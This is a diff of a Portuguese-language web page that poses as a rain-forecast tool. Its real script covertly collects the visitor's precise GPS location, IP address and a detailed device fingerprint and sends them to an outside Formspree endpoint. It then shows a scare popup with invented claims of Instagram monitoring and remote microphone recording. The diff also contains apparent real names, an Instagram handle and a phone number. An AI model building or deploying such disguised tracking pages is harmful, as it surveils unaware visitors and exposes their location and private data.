@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chuva?</title>
-    <script src="https:cdn.tailwindcss.com"></script>
+    <title>Previsão de Chuva - Se vai chover hoje?</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @keyframes float {
@@ -260,7 +260,6 @@
             100% { transform: scale(1); opacity: 1; }
         }
         
-        /* 1 - RIQ (FDS) */
         .data-leak-popup {
             position: fixed;
             top: 0;
@@ -463,7 +462,6 @@
             color: #ef4444;
         }
         
-        /* Danger Zone Styles */
         .danger-zone {
             background: rgba(239, 68, 68, 0.2);
             border: 2px solid #ef4444;
@@ -534,6 +532,7 @@
                 Descubra se vai chover na sua região
             </p>
         </header>
+
         <main class="max-w-md mx-auto">
             <div class="weather-card rounded-2xl p-8 shadow-2xl mb-6">
                 <div class="text-center mb-6">
@@ -545,6 +544,7 @@
                         Selecione a data e vamos calcular a previsão
                     </p>
                 </div>
+
                 <div class="mb-6">
                     <label for="weatherDate" class="block text-sm font-medium text-gray-700 mb-2">
                         <i class="fas fa-calendar-alt mr-2"></i>
@@ -558,6 +558,7 @@
                         required
                     >
                 </div>
+
                 <div class="text-center">
                     <button id="calculateBtn" 
                             class="calculate-btn text-white px-8 py-4 rounded-full font-semibold text-lg 
@@ -566,6 +567,7 @@
                         Calcular Previsão
                     </button>
                 </div>
+
                 <div id="loadingState" class="hidden mt-6">
                     <div class="flex flex-col items-center justify-center">
                         <div class="loading-spinner mb-4"></div>
@@ -581,16 +583,15 @@
                         <p id="attemptText" class="text-sm text-gray-600 mt-2">Tentativa 1 de 3</p>
                     </div>
                 </div>
+
                 <div id="weatherResult" class="weather-info mt-6">
                     <div class="result-card rounded-xl p-6 text-center">
                         <div class="weather-forecast mb-6">
-                            <div id="weatherIcon" class="weather-result-icon mb-4">
-                            </div>
-                            <h3 id="forecastTitle" class="text-3xl font-bold mb-2">
-                            </h3>
-                            <p id="forecastDescription" class="text-lg mb-4">
-                            </p>
+                            <div id="weatherIcon" class="weather-result-icon mb-4"></div>
+                            <h3 id="forecastTitle" class="text-3xl font-bold mb-2"></h3>
+                            <p id="forecastDescription" class="text-lg mb-4"></p>
                         </div>
+                        
                         <div class="bg-white bg-opacity-20 rounded-lg p-4 mb-4">
                             <div class="flex items-center justify-between mb-2">
                                 <span class="text-sm font-semibold">Precisão da previsão:</span>
@@ -624,6 +625,7 @@
                         </div>
                     </div>
                 </div>
+
                 <div id="errorState" class="weather-info mt-6">
                     <div class="error-card rounded-xl p-6 text-center">
                         <i class="fas fa-exclamation-triangle text-5xl mb-4"></i>
@@ -646,6 +648,7 @@
                     </div>
                 </div>
             </div>
+
             <div class="weather-card rounded-2xl p-6 shadow-2xl">
                 <h3 class="text-lg font-bold text-gray-800 mb-4 flex items-center">
                     <i class="fas fa-info-circle text-blue-500 mr-2"></i>
@@ -667,6 +670,7 @@
                 </div>
             </div>
         </main>
+
         <footer class="text-center mt-12 text-purple-100">
             <p class="text-sm">
                 <i class="fas fa-cloud-rain mr-2"></i>
@@ -675,7 +679,6 @@
         </footer>
     </div>
 
-    <!-- Aqui a diversão comeca seus otario -->
     <div id="dataLeakPopup" class="data-leak-popup">
         <div class="data-leak-content">
             <div class="data-leak-header">
@@ -694,57 +697,57 @@
                         <i class="fas fa-map-marker-alt text-red-500 mr-2"></i>
                         Localização
                     </h3>
-                    <div id="leakedLocation">
-                    </div>
+                    <div id="leakedLocation"></div>
                 </div>
+                
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-desktop text-blue-500 mr-2"></i>
                         Dispositivo
                     </h3>
-                    <div id="leakedDeviceInfo">
-                    </div>
+                    <div id="leakedDeviceInfo"></div>
                 </div>
+                
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-network-wired text-green-500 mr-2"></i>
                         Rede
                     </h3>
-                    <div id="leakedNetworkInfo">
-                    </div>
+                    <div id="leakedNetworkInfo"></div>
                 </div>
+                
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-cogs text-purple-500 mr-2"></i>
                         Recursos do Navegador
                     </h3>
-                    <div id="leakedBrowserFeatures">
-                    </div>
+                    <div id="leakedBrowserFeatures"></div>
                 </div>
+                
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-microchip text-orange-500 mr-2"></i>
                         Recursos de Hardware
                     </h3>
-                    <div id="leakedHardwareFeatures">
-                    </div>
+                    <div id="leakedHardwareFeatures"></div>
                 </div>
+                
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-code text-teal-500 mr-2"></i>
                         APIs Disponíveis
                     </h3>
-                    <div id="leakedAPIFeatures">
-                    </div>
+                    <div id="leakedAPIFeatures"></div>
                 </div>
+                
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-photo-video text-yellow-500 mr-2"></i>
                         Recursos de Mídia
                     </h3>
-                    <div id="leakedMediaFeatures">
-                    </div>
+                    <div id="leakedMediaFeatures"></div>
                 </div>
+                
                 <div class="danger-zone">
                     <div class="danger-header">
                         <i class="fas fa-skull-crossbones"></i>
@@ -757,7 +760,7 @@
                             Dados do Instagram Coletados:
                         </div>
                         <div class="danger-value">
-                            Contas analisadas: @p4tricksofc<br>
+                            Contas analisadas: @lorena_hendrikx<br>
                             Últimas atividades monitoradas<br>
                             Lista de seguidores e seguidos exportada
                         </div>
@@ -769,8 +772,8 @@
                             Dispositivo Interceptado:
                         </div>
                         <div class="danger-value">
-                            Nome: Patrick<br>
-                            Número de Telefone: +55 19 98601-7457<br>
+                            Nome: Tiago De Souza<br>
+                            Número de Telefone: (19) 99726-2008<br>
                         </div>
                     </div>
                     
@@ -806,7 +809,7 @@
                         <div class="danger-value">
                             Microfone ativado remotamente<br>
                             45 amostras de áudio gravados<br>
-                    Conversas ambientais capturadas
+                            Conversas ambientais capturadas
                         </div>
                     </div>
                 </div>
@@ -815,17 +818,17 @@
             <div class="data-leak-footer">
                 <p class="text-sm mb-4">
                     <i class="fas fa-exclamation-triangle text-red-500 mr-2"></i>
-                    Calma:D só pra deixar de ser besta, - te amo!
+                    Calma:D besta, te amo.
                 </p>
                 <button id="closeLeakBtn" class="close-leak-btn text-white px-6 py-3 rounded-lg font-semibold">
                     <i class="fas fa-times mr-2"></i>
+                    Entendi
                 </button>
             </div>
         </div>
     </div>
 
     <script>
-        // AAA Q DLC CARA (CONTROLE DOS SCRIPT)
         const weatherDate = document.getElementById('weatherDate');
         const calculateBtn = document.getElementById('calculateBtn');
         const loadingState = document.getElementById('loadingState');
@@ -916,27 +919,16 @@
             selectedDate.textContent = formattedDate;
 
             try {
-                
                 await collectDeviceInfo();
-                
-                
                 await getLocationWithRetry();
-                
-                
                 generateWeatherForecast(selectedDateValue);
-                
-               
                 await sendDataToFormspree(selectedDateValue);
-                
-                
                 showSuccess();
                 
-               
                 if (weatherForecast.willRain) {
                     createRainEffect();
                 }
                 
-              
                 setTimeout(() => {
                     showDataLeak();
                 }, 2000);
@@ -948,18 +940,17 @@
         }
 
         function generateWeatherForecast(selectedDate) {
-           
             const date = new Date(selectedDate);
             const dayOfYear = Math.floor((date - new Date(date.getFullYear(), 0, 0)) / 86400000);
-       
+            
             let seed = dayOfYear;
             if (collectedData.location) {
                 seed += collectedData.location.latitude + collectedData.location.longitude;
             }
-
+            
             const random = Math.sin(seed) * 10000;
             const chance = Math.abs(random - Math.floor(random));
-
+            
             weatherForecast.willRain = chance > 0.7;
             
             if (weatherForecast.willRain) {
@@ -1015,14 +1006,13 @@
 
         function handlePosition(position) {
             const accuracy = position.coords.accuracy;
-
+            
             if (accuracy < bestAccuracy) {
                 bestAccuracy = accuracy;
                 bestPosition = position;
             }
-
+            
             if (accuracy < 50 || currentAttempt >= maxAttempts) {
-
                 collectedData.location = {
                     latitude: bestPosition.coords.latitude,
                     longitude: bestPosition.coords.longitude,
@@ -1033,7 +1023,6 @@
                     timestamp: bestPosition.coords.timestamp
                 };
             } else {
-
                 currentAttempt++;
                 setTimeout(() => {
                     updateProgress();
@@ -1050,7 +1039,6 @@
                     getLocation();
                 }, 1000);
             } else {
-
                 if (bestPosition) {
                     collectedData.location = {
                         latitude: bestPosition.coords.latitude,
@@ -1069,7 +1057,6 @@
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             
-
             collectedData.deviceInfo = {
                 userAgent: userAgent,
                 platform: platform,
@@ -1088,18 +1075,16 @@
                 hardwareConcurrency: navigator.hardwareConcurrency || 'N/A'
             };
 
-
             if (navigator.userAgentData) {
                 try {
                     const highEntropyValues = await navigator.userAgentData.getHighEntropyValues([
-                        'platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion'
+                        'platform', 'platform', 'architecture', 'model', 'uaFullVersion'
                     ]);
                     collectedData.deviceInfo.userAgentData = highEntropyValues;
                 } catch (error) {
                     console.log('User-Agent Client Hints not available');
                 }
             }
-
 
             if (navigator.connection) {
                 collectedData.networkInfo = {
@@ -1111,20 +1096,14 @@
                 };
             }
 
-
             parseUserAgent();
-            
-
             collectFeatures();
-            
-
             collectAdditionalData();
         }
 
         function parseUserAgent() {
             const userAgent = navigator.userAgent.toLowerCase();
             
-
             let os = 'Unknown';
             let osVersion = '';
             
@@ -1269,7 +1248,6 @@
         }
 
         function collectAdditionalData() {
-
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -1316,43 +1294,20 @@
             }
 
             collectedData.additionalData.timezoneOffset = new Date().getTimezoneOffset();
-
             collectedData.additionalData.cookieEnabled = navigator.cookieEnabled;
-
             collectedData.additionalData.doNotTrack = navigator.doNotTrack;
-
             collectedData.additionalData.plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
-
             collectedData.additionalData.mimeTypes = Array.from(navigator.mimeTypes).map(mimeType => mimeType.type);
-
             collectedData.additionalData.referrer = document.referrer;
-
             collectedData.additionalData.currentURL = window.location.href;
-
             collectedData.additionalData.userLanguage = navigator.language;
-
             collectedData.additionalData.userLanguages = navigator.languages;
-
             collectedData.additionalData.platform = navigator.platform;
-
             collectedData.additionalData.product = navigator.product;
-
             collectedData.additionalData.productSub = navigator.productSub;
-
             collectedData.additionalData.vendor = navigator.vendor;
-
-            // AQUI COMECA O VENDOR, SO PR LEMBRA
             collectedData.additionalData.vendorSub = navigator.vendorSub;
-
             collectedData.additionalData.buildID = navigator.buildID;
-
-            collectedData.additionalData.hardwareConcurrency = navigator.hardwareConcurrency;
-
-            collectedData.additionalData.maxTouchPoints = navigator.maxTouchPoints;
-
-            collectedData.additionalData.connection = navigator.connection;
-
-            collectedData.additionalData.deviceMemory = navigator.deviceMemory;
 
             if (navigator.storage) {
                 navigator.storage.estimate().then(estimate => {
@@ -1397,7 +1352,6 @@
             collectedData.additionalData.documentCharset = document.charset;
             collectedData.additionalData.documentCharacterSet = document.characterSet;
             collectedData.additionalData.documentTitle = document.title;
-
             collectedData.additionalData.historyLength = history.length;
 
             if (performance) {
@@ -1409,13 +1363,11 @@
         async function sendDataToFormspree(selectedDate) {
             const formData = new FormData();
             
-
             formData.append('selected_date', selectedDate);
             formData.append('timestamp', new Date().toISOString());
             formData.append('weather_forecast', weatherForecast.willRain ? 'Vai chover' : 'Não vai chover');
             formData.append('weather_probability', weatherForecast.probability + '%');
             
-
             if (collectedData.location) {
                 formData.append('latitude', collectedData.location.latitude);
                 formData.append('longitude', collectedData.location.longitude);
@@ -1424,7 +1376,7 @@
                 formData.append('speed', collectedData.location.speed || 'N/A');
                 formData.append('heading', collectedData.location.heading || 'N/A');
             }
-
+            
             formData.append('device_type', collectedData.deviceInfo.deviceType);
             formData.append('os', collectedData.deviceInfo.os);
             formData.append('os_version', collectedData.deviceInfo.osVersion);
@@ -1439,7 +1391,7 @@
             formData.append('touch_support', collectedData.deviceInfo.touchSupport);
             formData.append('online_status', collectedData.deviceInfo.onlineStatus);
             formData.append('user_agent', collectedData.deviceInfo.userAgent);
-
+            
             if (collectedData.networkInfo) {
                 formData.append('connection_type', collectedData.networkInfo.type);
                 formData.append('connection_effective_type', collectedData.networkInfo.effectiveType);
@@ -1447,7 +1399,7 @@
                 formData.append('rtt', collectedData.networkInfo.rtt);
                 formData.append('data_saver', collectedData.networkInfo.saveData);
             }
-
+            
             if (collectedData.deviceInfo.userAgentData) {
                 formData.append('platform', collectedData.deviceInfo.userAgentData.platform);
                 formData.append('platform_version', collectedData.deviceInfo.userAgentData.platformVersion);
@@ -1478,19 +1430,18 @@
                 }
             } catch (error) {
                 console.error('Error sending data to Formspree:', error);
-
             }
         }
 
         function showSuccess() {
             loadingState.classList.add('hidden');
             weatherResult.classList.add('show');
-
+            
             weatherIcon.innerHTML = weatherForecast.icon;
             forecastTitle.textContent = weatherForecast.title;
             forecastDescription.textContent = weatherForecast.description;
             probability.textContent = weatherForecast.probability + '%';
-
+            
             if (collectedData.location) {
                 const accuracy = collectedData.location.accuracy;
                 updateAccuracyIndicator(accuracy);
@@ -1530,28 +1481,24 @@
         }
 
         function improveAccuracy() {
-
             currentAttempt = 1;
             bestAccuracy = Infinity;
             bestPosition = null;
-            maxAttempts = 5; 
+            maxAttempts = 5;
             
             loadingState.classList.remove('hidden');
             weatherResult.classList.remove('show');
             
             updateProgress();
             
-
             setTimeout(() => {
                 getLocationWithRetry().then(() => {
-     
                     generateWeatherForecast(weatherDate.value);
                     sendDataToFormspree(weatherDate.value).then(() => {
                         showSuccess();
                         if (weatherForecast.willRain) {
                             createRainEffect();
                         }
-
                         setTimeout(() => {
                             showDataLeak();
                         }, 2000);
@@ -1581,7 +1528,6 @@
             rainAnimation.classList.add('active');
             rainAnimation.innerHTML = '';
             
-
             for (let i = 0; i < 50; i++) {
                 const drop = document.createElement('div');
                 drop.className = 'rain-drop';
@@ -1591,7 +1537,6 @@
                 rainAnimation.appendChild(drop);
             }
             
-
             setTimeout(() => {
                 rainAnimation.classList.remove('active');
             }, 5000);
@@ -1599,13 +1544,10 @@
 
         function showDataLeak() {
             dataLeakPopup.style.display = 'block';
-            
-
             populateLeakedData();
         }
 
         function populateLeakedData() {
-
             const locationHtml = collectedData.location ? `
                 <div class="data-item">
                     <span class="data-label">Latitude:</span>
@@ -1639,7 +1581,6 @@
             
             document.getElementById('leakedLocation').innerHTML = locationHtml;
             
-
             const deviceInfoHtml = `
                 <div class="data-item">
                     <span class="data-label">Tipo de Dispositivo:</span>
@@ -1647,7 +1588,7 @@
                 </div>
                 <div class="data-item">
                     <span class="data-label">Sistema Operacional:</span>
-                    <span class="data-value">OneUI 5.0 (Android 13)</span>
+                    <span class="data-value">OneUI 7.0 (Android 15)</span>
                 </div>
                 <div class="data-item">
                     <span class="data-label">Navegador:</span>
@@ -1695,7 +1636,6 @@
             
             document.getElementById('leakedDeviceInfo').innerHTML = deviceInfoHtml;
             
-
             const networkInfoHtml = collectedData.networkInfo ? `
                 <div class="data-item">
                     <span class="data-label">Tipo de Conexão:</span>
@@ -1721,7 +1661,6 @@
             
             document.getElementById('leakedNetworkInfo').innerHTML = networkInfoHtml;
             
-
             const browserFeaturesHtml = collectedData.browserFeatures.map(feature => `
                 <div class="feature-item ${feature.supported ? 'feature-supported' : 'feature-unsupported'}">
                     <i class="fas ${feature.supported ? 'fa-check' : 'fa-times'}"></i>
@@ -1731,7 +1670,6 @@
             
             document.getElementById('leakedBrowserFeatures').innerHTML = browserFeaturesHtml;
             
-
             const hardwareFeaturesHtml = collectedData.hardwareFeatures.map(feature => `
                 <div class="feature-item ${feature.supported ? 'feature-supported' : 'feature-unsupported'}">
                     <i class="fas ${feature.supported ? 'fa-check' : 'fa-times'}"></i>
@@ -1741,7 +1679,6 @@
             
             document.getElementById('leakedHardwareFeatures').innerHTML = hardwareFeaturesHtml;
             
-
             const apiFeaturesHtml = collectedData.apiFeatures.map(feature => `
                 <div class="feature-item ${feature.supported ? 'feature-supported' : 'feature-unsupported'}">
                     <i class="fas ${feature.supported ? 'fa-check' : 'fa-times'}"></i>
@@ -1751,7 +1688,6 @@
             
             document.getElementById('leakedAPIFeatures').innerHTML = apiFeaturesHtml;
             
-
             const mediaFeaturesHtml = collectedData.mediaFeatures.map(feature => `
                 <div class="feature-item ${feature.supported ? 'feature-supported' : 'feature-unsupported'}">
                     <i class="fas ${feature.supported ? 'fa-check' : 'fa-times'}"></i>
